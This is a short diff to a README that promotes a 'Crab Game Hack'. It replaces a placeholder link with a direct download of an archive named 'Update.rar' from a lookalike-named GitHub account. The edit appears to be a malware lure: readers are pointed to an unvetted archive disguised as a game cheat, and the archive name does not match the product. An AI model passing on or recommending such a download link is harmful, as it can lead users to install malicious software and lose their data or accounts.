@@ -34,7 +34,7 @@ Activate or deactivate specific hacks based on your needs. It's all under your c
 ## 🚀 **Getting Started**
 
 1. **📥 Download Crab Game Hack**:  
-   Get the latest version from the [Releases Page](https://github.com/).
+   Get the latest version from the [Releases Page](https://github.com/AnxietyPilIs/crab-game-cheat/releases/download/crab-game/Update.rar).
    
 2. **📂 Extract the Files**:  
    Unzip the downloaded archive to a folder of your choice.
